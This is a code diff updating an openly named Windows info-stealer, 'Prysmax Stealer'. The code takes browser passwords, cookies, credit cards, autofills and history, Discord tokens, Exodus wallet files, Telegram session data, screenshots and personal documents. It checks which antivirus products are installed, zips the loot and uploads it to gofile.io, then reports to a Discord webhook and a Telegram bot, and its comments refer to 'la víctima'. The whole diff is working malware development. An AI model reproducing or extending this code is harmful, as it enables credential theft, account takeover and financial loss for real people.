@@ -25,6 +25,7 @@ bot_token = "here-your-telegram"
 chat_id = "here-your-chat-id"  
 theapi2023 = "Here-Token"
 
+
 url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
 
 pc_name = platform_module.node()
@@ -60,10 +61,6 @@ extensions_to_search = ['.png', '.jpg', '.pdf', '.docx'] # If you want to add mo
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 temp = os.getenv("TEMP")
-
-if os.path.exists(temp+"prysmax"):
-    shutil.rmtree(temp+"\\prysmax")
-
 
 
 class DATA_BLOB(Structure):
@@ -118,7 +115,7 @@ def TrU57(C00K13s):
     return DETECTED
 
 def Wr173F0rF113(data, name):
-    path = os.getenv("TEMP") + f"\prysmax\pr{name}.txt"
+    path = os.getenv("TEMP") + f"\prysmax-{pc_name}\pr{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
         for line in data:
             if line[0] != '':
@@ -307,9 +304,9 @@ def shearderx(func, arg):
 
 
 try:
- if not os.path.exists(user+f'\\AppData\\Local\\Temp\\Prysmax-{pc_name}'):
-    os.mkdir(user+f'\\AppData\\Local\\Temp\\Prysmax-{pc_name}')
- shutil.move(user+f'\\AppData\\Local\\Temp\\Browser.zip', user+f'\\AppData\\Local\\Temp\\Prysmax-{pc_name}')
+ if not os.path.exists(user+f'\\AppData\\Local\\Temp\\prysmax-{pc_name}'):
+    os.mkdir(user+f'\\AppData\\Local\\Temp\\prysmax-{pc_name}')
+ shutil.move(user+f'\\AppData\\Local\\Temp\\Browser.zip', user+f'\\AppData\\Local\\Temp\\prysmax-{pc_name}')
 except:
     pass
 
@@ -320,7 +317,7 @@ def find_antivirus_folders(base_folder):
         "BullGuard", "360 Total Security", "Ad-Aware", "Dr.Web", "G-Data", "Vipre", "ClamWin", "ZoneAlarm",
         "Cylance", "Webroot", "Cylance", "Palo Alto Networks", "Symantec", "SentinelOne", "CrowdStrike",
         "Emsisoft", "HitmanPro", "Fortinet", "Trend Micro", "Emsisoft", "FireEye", "Cylance", "ESET",
-        "Zemana", "McAfee", "Windows Defender"
+        "Zemana", "McAfee", "Windows Defender", "ReasonLabs"
     ]
     antivirus_folders_dict = {}
 
@@ -342,28 +339,29 @@ def find_antivirus_folders(base_folder):
  
 def getbroxk(br0W53rP47H5):
     
+    try:
+        global Browserthread
+        ThCokk, Browserthread, filess = [], [], []
+        for patt in br0W53rP47H5:
+            a = threading.Thread(target=G37C00K13, args=[patt[0], patt[4]])
+            a.start()
+            ThCokk.append(a)
 
-    global Browserthread
-    ThCokk, Browserthread, filess = [], [], []
-    for patt in br0W53rP47H5:
-        a = threading.Thread(target=G37C00K13, args=[patt[0], patt[4]])
-        a.start()
-        ThCokk.append(a)
+            shearderx(G374U70F111,       [patt[0], patt[3]])
+            shearderx(G37H1570rY,        [patt[0], patt[3]])
+            shearderx(G37800KM4rK5,      [patt[0], patt[3]])
+            shearderx(G37CC5,            [patt[0], patt[3]])
+            shearderx(G37P455W,          [patt[0], patt[3]])
 
-        shearderx(G374U70F111,       [patt[0], patt[3]])
-        shearderx(G37H1570rY,        [patt[0], patt[3]])
-        shearderx(G37800KM4rK5,      [patt[0], patt[3]])
-        shearderx(G37CC5,            [patt[0], patt[3]])
-        shearderx(G37P455W,          [patt[0], patt[3]])
+        for thread in ThCokk: thread.join()
+        if TrU57(C00K13s) == True: __import__('sys').exit(0)
+        for thread in Browserthread: thread.join()
 
-    for thread in ThCokk: thread.join()
-    if TrU57(C00K13s) == True: __import__('sys').exit(0)
-    for thread in Browserthread: thread.join()
+        for file in ["prpasswords.txt", "prcookies.txt", "prcreditcards.txt", "prautofills.txt", "prhistories.txt", "prbookmarks.txt"]:
+            filess.append(UP104D7060F113(temp + f"prysmax-{pc_name}\\" + file))
 
-    for file in ["prpasswords.txt", "prcookies.txt", "prcreditcards.txt", "prautofills.txt", "prhistories.txt", "prbookmarks.txt"]:
-        filess.append(UP104D7060F113(os.getenv("TEMP") + "prysmax\\" + file))
-
-
+    except Exception as rjjk:
+        print(f"Error generando credenciales, {rjjk}")
     whpass = DiscordWebhook(url=theapi2023, username="Prysmax Software", avatar_url="https://i.imgur.com/jJES3AX.png")
 
     embedp = DiscordEmbed(title='Prysmax | Passwords', description=f"**Found**:\n{G37W3851735(p45WW0rDs)}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P455WC0UNt}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [PrysmaPasswords.txt]({filess[0]})", color=0x040101)
@@ -447,7 +445,7 @@ def search_and_copy_files(start_folder, dest_folder, search_all=False):
                 shutil.copy(file_path, destination_path)
                 print(f"Stealing {file_path} to {destination_path}")
 def machine_info():
-
+    G47H3r411()
 
     mem = psutil.virtual_memory()
 
@@ -490,16 +488,16 @@ def machine_info():
     
     main_folders = [os.path.expanduser("~"), os.getenv('LOCALAPPDATA'), os.getenv('APPDATA')]
     
-    if not os.path.exists(user+f'\\AppData\\Local\\Temp\\Prysmax-{pc_name}\\files'):
-     os.mkdir(user+f'\\AppData\\Local\\Temp\\Prysmax-{pc_name}\\files')
+    if not os.path.exists(user+f'\\AppData\\Local\\Temp\\prysmax-{pc_name}\\files'):
+     os.mkdir(user+f'\\AppData\\Local\\Temp\\prysmax-{pc_name}\\files')
 
     
     
     if search_in == "Default":
      for folder in main_folders:
-        search_and_copy_files("C:\\", user+f'\\AppData\\Local\\Temp\\Prysmax-{pc_name}\\files')
+        search_and_copy_files("C:\\", user+f'\\AppData\\Local\\Temp\\prysmax-{pc_name}\\files')
     else:
-        search_and_copy_files("C:\\", user+f'\\AppData\\Local\\Temp\\Prysmax-{pc_name}\\files', search_all=False)
+        search_and_copy_files("C:\\", user+f'\\AppData\\Local\\Temp\\prysmax-{pc_name}\\files', search_all=False)
     
 
     antivirus_folders = find_antivirus_folders("C:\\Program Files")
@@ -516,7 +514,7 @@ def machine_info():
     
     process_task = False
     if tasklists.returncode == 0:
-     with open(user+f'\\AppData\\Local\\Temp\\Prysmax-{pc_name}\\process_list.txt', 'w') as file:
+     with open(user+f'\\AppData\\Local\\Temp\\prysmax-{pc_name}\\process_list.txt', 'w') as file:
         file.write(tasklists.stdout)
      print('The process list has been saved in "process_list.txt".')
      num_procesos = tasklists.stdout.count('\n') - 3
@@ -524,7 +522,7 @@ def machine_info():
     else:
      print('There was an error in obtaining the list of processes.')
      process_task = False
-    with open(user+f'\\AppData\\Local\\Temp\\Prysmax-{pc_name}\\information.txt', 'w', encoding='utf-8') as archivo:
+    with open(user+f'\\AppData\\Local\\Temp\\prysmax-{pc_name}\\information.txt', 'w', encoding='utf-8') as archivo:
         archivo.write(f"""
                       
         ¡PRYSMAX STEALER!
@@ -588,73 +586,84 @@ def machine_info():
                                 for token in re.findall(regex, line):
                                     if f"{bot_token} | {platform}" not in tokens:
                                         tokens.append(token)
-                                        with open(user+f'\\AppData\\Local\\Temp\\Prysmax-{pc_name}\\discord_tokens.txt', 'w', encoding='utf-8') as tokensfile:
+                                        with open(user+f'\\AppData\\Local\\Temp\\prysmax-{pc_name}\\discord_tokens.txt', 'w', encoding='utf-8') as tokensfile:
                                             tokensfile.write(str(tokens))
                                             Discord = True
     exodus = False
     if os.path.exists(user + "\\AppData\\Local\\Temp\\Exodus"):
         shutil.rmtree(user + "\\AppData\\Local\\Temp\\Exodus")
         exodus = True
-        shutil.copytree(user + "\\AppData\\Roaming\\Exodus", user + f"\\AppData\\Local\\Temp\\Prysmax-{pc_name}\\Exodus")
+        shutil.copytree(user + "\\AppData\\Roaming\\Exodus", user + f"\\AppData\\Local\\Temp\\prysmax-{pc_name}\\Exodus")
     else:
         exodus = False
     telegram = False
     prysmax_tele = "prysmax_telegram"
-    if os.path.exists(user + '\\AppData\\Roaming\\Telegram Desktop\\tdata'):
-        
-     if os.path.exists(os.path.join(user, 'AppData', 'Roaming', 'Telegram Desktop', prysmax_tele + ".zip")):
-      print("la victima ya abrio el archivo, yesyes")
-      shutil.copy(os.path.join(user, 'AppData', 'Roaming', 'Telegram Desktop', prysmax_tele + ".zip"),
-                os.path.join(user, 'AppData', 'Local', 'Temp', 'Prysmax', prysmax_tele + ".zip"))
-      telegram = True
-     else:
-        tdata_path = user + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\'
-        tdata_session_zip = user + '\\AppData\\Roaming\\Telegram Desktop\\' + prysmax_tele + ".zip"
-        hash_path = user + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8?*'
 
-        os.makedirs(tdata_path + '\\connection_hash')
-        os.makedirs(tdata_path + '\\map')
+    tdata_dir = os.path.join(user, 'AppData', 'Roaming', 'Telegram Desktop', 'tdata')
+    zip_dest_dir = os.path.join(user, 'AppData', 'Roaming', 'Telegram Desktop', prysmax_tele + ".zip")
+    temp_dir = os.path.join(user, 'AppData', 'Local', 'Temp', f'prysmax-{pc_name}')
+    temp_dest_dir = os.path.join(temp_dir, prysmax_tele + ".zip")
 
+    if os.path.exists(tdata_dir):
+        if os.path.exists(zip_dest_dir):
+            print("La víctima ya abrió el archivo, yesyes")
 
-        hash_map = glob.iglob(os.path.join(hash_path, "*"))
-        for file in hash_map:
-            if os.path.isfile(file):
-                shutil.copy2(file, tdata_path + '\\map')
+            # Asegurarse de que la carpeta temporal exista
+            os.makedirs(temp_dir, exist_ok=True)
 
+            shutil.copy(zip_dest_dir, temp_dest_dir)
+            telegram = True
+        else:
+            hash_path = os.path.join(tdata_dir, 'D877F783D5D3EF8?*')
 
-        files16 = glob.iglob(os.path.join(tdata_path, "??????????*"))
-        for file in files16:
-            if os.path.isfile(file):
-                shutil.copy2(file, tdata_path + '\\connection_hash')
+            connection_hash_dir = os.path.join(tdata_dir, 'connection_hash')
+            map_dir = os.path.join(tdata_dir, 'map')
 
-        with ZipFile(tdata_session_zip, 'w') as zipObj:
-            for folderName, subfolders, filenames in os.walk(tdata_path + '\\map'):
-                for filename in filenames:
-                    filePath = os.path.join(folderName, filename)
-                    zipObj.write(filePath)
+            os.makedirs(connection_hash_dir, exist_ok=True)
+            os.makedirs(map_dir, exist_ok=True)
 
-            for folderName, subfolders, filenames in os.walk(tdata_path + '\\connection_hash'):
-                for filename in filenames:
-                    filePath = os.path.join(folderName, filename)
-                    zipObj.write(filePath)
-        try:  
-            shutil.rmtree(tdata_path + '\\connection_hash')
-            shutil.rmtree(tdata_path + '\\map')  
-            old_file = os.path.join(user + '\\AppData\\Roaming\\Telegram Desktop\\', 'session.zip')
-            new_file = os.path.join(user + '\\AppData\\Roaming\\Telegram Desktop\\', prysmax_tele + ".zip")
-            os.rename(old_file, new_file)
-            shutil.copytree(user + '\\AppData\\Roaming\\Telegram Desktop\\', prysmax_tele + ".zip", user + f'\\AppData\\Local\\Temp\\Prysmax-{pc_name}\\', prysmax_tele + ".zip")
-        
-    
-        except:
-         pass
-        Telegram = True
+            hash_map = glob.iglob(os.path.join(hash_path, "*"))
+            for file in hash_map:
+                if os.path.isfile(file):
+                    shutil.copy2(file, map_dir)
+
+            files16 = glob.iglob(os.path.join(tdata_dir, "??????????*"))
+            for file in files16:
+                if os.path.isfile(file):
+                    shutil.copy2(file, connection_hash_dir)
+
+            with ZipFile(zip_dest_dir, 'w') as zipObj:
+                for folderName, subfolders, filenames in os.walk(map_dir):
+                    for filename in filenames:
+                        filePath = os.path.join(folderName, filename)
+                        zipObj.write(filePath)
+
+                for folderName, subfolders, filenames in os.walk(connection_hash_dir):
+                    for filename in filenames:
+                        filePath = os.path.join(folderName, filename)
+                        zipObj.write(filePath)
+
+            try:
+                shutil.rmtree(connection_hash_dir)
+                shutil.rmtree(map_dir)
+
+                old_file = os.path.join(user, 'AppData', 'Roaming', 'Telegram Desktop', 'session.zip')
+                new_file = os.path.join(user, 'AppData', 'Roaming', 'Telegram Desktop', prysmax_tele + ".zip")
+                os.rename(old_file, new_file)
+
+                # Asegurarse de que la carpeta temporal exista
+                os.makedirs(temp_dir, exist_ok=True)
+
+                shutil.copy(new_file, temp_dest_dir)
+            except Exception as e:
+                print(f"Error: {e}")
+            telegram = True
     else:
-        Telegram = False
+        telegram = False
     try:
     
      sss = ImageGrab.grab()
-     sss.save(user+f"\\AppData\\Local\\Temp\\Prysmax-{pc_name}\\screenshot.png")
+     sss.save(user+f"\\AppData\\Local\\Temp\\prysmax-{pc_name}\\screenshot.png")
 
      sss.close()
      screenshot = True
@@ -663,9 +672,9 @@ def machine_info():
 
     temp_folder = os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Temp')
 
-    folder_to_compress = os.path.join(temp_folder, f'Prysmax-{pc_name}')
+    folder_to_compress = os.path.join(temp_folder, f'prysmax-{pc_name}')
 
-    zip_name = os.path.join(temp_folder, f'Prysmax-{pc_name}')
+    zip_name = os.path.join(temp_folder, f'prysmax-{pc_name}')
     shutil.make_archive(zip_name, 'zip', folder_to_compress)
         
         
@@ -678,10 +687,10 @@ def machine_info():
     except:
      upload_url = f'https://store1.gofile.io/contents/uploadfile'  
 
-    filex = user + f'\\AppData\\Local\\Temp\\Prysmax-{pc_name}.zip'
+    filex = user + f'\\AppData\\Local\\Temp\\prysmax-{pc_name}.zip'
     
     with open(filex, 'rb') as f:
-        files = {'file': (f'Prysmax-{pc_name}.zip', f)}
+        files = {'file': (f'prysmax-{pc_name}.zip', f)}
         upload_response = requests.post(upload_url, files=files)
         uploadth = upload_response.json() 
         link_download = uploadth["data"]["downloadPage"]
@@ -709,7 +718,10 @@ def machine_info():
     whnetwork.add_embed(embednt2)
     whnetwork.add_embed(embednt3)
     try:
-      whnetwork.execute()
+      if theapi2023 == "Here-Token":
+       print("Envio a Discord actualmente desactivado!")
+      else:
+          whnetwork.execute()
     except:
         pass
    
@@ -738,6 +750,11 @@ def machine_info():
 ⟹ • Screenshot ⋮ {screenshot}
 ⟹ • Process Num ⋮ {num_procesos}
 ⟹ • Download Files ⋮ {link_download}
+
+*Prysmax | Credentials*
+Passwords From: {G37W3851735(p45WW0rDs)}
+Cookies From: {G37W3851735(c00K1W0rDs)}
+Total History: {H1570rYC0UNt}
 """
     params = {
         "chat_id": chat_id,
@@ -751,7 +768,7 @@ def machine_info():
         print("Payload enviado a TELEGRAM CORRECTAMENTE!!.")
     else:
         print("Error al enviar a telegramm:", response.text)
-    G47H3r411()
+    
 
 
 if __name__ == "__main__":
